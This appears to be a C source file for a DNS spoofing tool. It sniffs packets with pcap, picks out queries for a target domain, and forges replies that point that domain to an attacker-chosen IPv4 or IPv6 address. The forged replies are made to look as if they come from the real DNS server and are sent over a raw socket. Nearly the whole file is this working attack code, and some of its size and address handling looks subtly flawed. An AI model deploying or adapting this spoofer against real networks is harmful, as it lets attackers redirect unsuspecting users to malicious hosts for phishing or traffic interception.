#include "spoof.h"


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ethernet */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(pkthdr, packet);
    }
//    if (ntohs(ether->ether_type) == ETHERTYPE_IPV6) {
//        opts.ipv6_flag = TRUE;
//        process_ipv6(pkthdr, packet);
//        opts.ipv6_flag = FALSE;
//    }
}


void process_ipv4(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    unsigned short size_payload;
    struct ether_header* ether;
    struct iphdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns;

    struct ether_header eh;
    struct iphdr ih;
    struct udphdr uh;
    struct dnshdr dh;

    char* answer = NULL;
    char request[URL_SIZE] = {0}, response[DEFAULT_SIZE] = {0}, buffer[DEFAULT_SIZE] = {0};
    unsigned short size = 0;
    unsigned short size_answer;


    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
    dns = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));

    size_payload = ntohs(ip->tot_len) - sizeof(struct iphdr) + sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query((u_char *)dns, request);
        if (!strcmp(request, opts.request_url)) {
            puts("[ IPv4 ]");
            /* set up opts (get necessary info) */
            answer = response;
            size = create_dns_answer(answer, &size_answer);
            size_answer = size;
            size += create_dns_header((u_char *)dns, &dh);
            size += create_udp_header((u_char *)udp, &uh, size);
            size += create_ip_header((u_char *)ip, &ih, size);
            size += create_ethernet_header((u_char *)ether, &eh);

            memcpy(buffer, &eh, sizeof(struct ether_header));
            memcpy(buffer + sizeof(struct ether_header), &ih, sizeof(struct iphdr));
            memcpy(buffer + sizeof(struct ether_header) + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
            memcpy(buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr), &dh, sizeof(struct dnshdr));
            memcpy(buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr), response, size_answer);

            send_dns_answer(buffer, size);
        }
    }
}


unsigned short create_dns_answer(char* answer, unsigned short* size_answer) {
    unsigned short size = 0;
    char* token;
    int j = 0;
    uint8_t addr[IPV6_LEN];

    for (int i = 0; i < strlen((char*)opts.query_name); i++) {
        answer[i] = (char) opts.query_name[i];
    }
    answer[strlen((char*)opts.query_name)] = 0;
    answer += strlen((char*)opts.query_name) + 1;
    size += strlen((char*)opts.query_name) + 1;

    memcpy(answer, opts.type, 2);  // type
    answer += 2;
    size += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;
    size += 2;

    memcpy(answer, "\xc0\x0c", 2);  // pointer to name
    answer += 2;
    size += 2;

    memcpy(answer, opts.type, 2);  // type
    answer += 2;
    size += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;
    size += 2;

    memcpy(answer, "\x00\x00\x00\x40", 4);  // ttl
    answer += 4;
    size += 4;

    if (opts.type[1] == '\x01') {
        memcpy(answer, "\x00\x04", 2);   // data len
        answer += 2;
        size += 2;

        token = strtok(opts.spoofing_ip, ".");
        while (token != NULL) {
            answer[j] = (uint8_t) atoi(token);
            token = strtok(NULL, ".");
            j++;
        }
        size += 4;
        *size_answer = size;
        return (uint16_t) size;
    }
    if (opts.type[1] == '\x1c') {
        memcpy(answer, "\x00\x10", 2);   // data len
        answer += 2;
        size += 2;

        inet_pton(AF_INET6, opts.device_ipv6, addr);
        memcpy(answer, addr, IPV6_LEN);
        size += 16;
        *size_answer = size;
        return size;
    }
}


unsigned short create_dns_header(u_char* dns, struct dnshdr* dh) {
    struct dnshdr* dns_hdr = NULL;

    dns_hdr = (struct dnshdr*) dns;
    dh->id = dns_hdr->id;
    dh->qr = 1; // This is a response
    dh->opcode = 0; // Standard response
    dh->aa = 0; // Not Authoritative (This might change based on your DNS server)
    dh->tc = 0; // Message not truncated
    dh->rd = 1; // Recursion Desired
    dh->ra = 1; // Recursion available -
    dh->z = 0; // Reserved field
    dh->ad = 0; // Authenticated data (relevant in DNSSEC)
    dh->cd = 0; // Checking disabled (relevant in DNSSEC)
    dh->rcode = 0; // Response code - should be 0 (NOERROR) for a successful response
    dh->q_count = htons(1); // only 1 question
    dh->ans_count = htons(1); // Number of answer RRs - Change this to reflect the number of answers
    dh->auth_count = 0; // Number of authority RRs - Change this if you're including any authority RRs
    dh->add_count = 0; // Number of additional RRs - Change this if you're including any additional RRs

    return sizeof(struct dnshdr);
}


unsigned short create_udp_header(u_char* udp, struct udphdr* uh, unsigned short size) {
    struct udphdr* udp_hdr = NULL;

    udp_hdr = (struct udphdr*) udp;
    uh->source = udp_hdr->dest;
    uh->dest = udp_hdr->source;
    uh->len = htons(size + sizeof(struct udphdr));
    uh->check = 0;

    return sizeof(struct udphdr);
}


unsigned short create_ip_header(u_char* ip, struct iphdr* ih, unsigned short size) {
    struct in_addr ip_addr;
    struct iphdr* ip_hdr = NULL;

    ip_hdr = (struct iphdr*) ip;
    ip_addr.s_addr = ip_hdr->daddr;
    strcpy(opts.dns_ip, inet_ntoa(ip_addr));

    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = ip_hdr->id;
    ih->tot_len = htons(size + sizeof(struct iphdr));
    ih->frag_off = 0;
    ih->ttl = 64;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(opts.dns_ip);
    ih->daddr = host_convert(opts.device_ip);
    ih->check = calc_ip_checksum((struct ip *) ih);

    return sizeof(struct iphdr);
}


unsigned short create_ethernet_header(u_char* ether, struct ether_header* eh) {
    struct ether_header* eth_hdr = NULL;

    eth_hdr = (struct ether_header*) ether;
    memcpy(eh->ether_shost, eth_hdr->ether_dhost, 6);
    memcpy(eh->ether_dhost, eth_hdr->ether_shost, 6);
    eh->ether_type = htons(ETH_P_IP);

    return sizeof(struct ether_header);
}


/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[5]abcdefg[3]com[0]
 * And it is returned in this: www.abcdefg.com
 */
void handle_DNS_query(u_char * dns, char *request) {
    unsigned int i, j, k;
    uint8_t* curr = NULL;
    unsigned int size;

    curr = (uint8_t*) (dns + 12);

    size = (unsigned int) curr[0];

    j=0;
    i=1;
    while(size > 0) {
        for(k=0; k<size; k++) {
            request[j++] = curr[i + k];
        }
        request[j++]='.';
        i+=size;
        size = curr[i++];
    }
    request[--j] = '\0';
    opts.query_name = curr;
    curr += strlen(request) + 2;
    memcpy(opts.type, curr, 2);
}


void send_dns_answer(char* buffer, uint16_t size) {
    struct sockaddr_ll sa;
    int sockfd;
    int bytes_sent;

    sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd == -1) {
        perror("socket");
        exit(1);
    }

    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex(nic_device); // The network interface to send through
    sa.sll_halen = ETHER_ADDR_LEN;
    memcpy(sa.sll_addr, opts.dns_ip, 6);

    bytes_sent = sendto(sockfd, buffer, size, 0, (struct sockaddr *) &sa, sizeof(sa));
    if (bytes_sent < 0) {
        fprintf(stderr, "Error sending data");
        exit(1);
    }
}
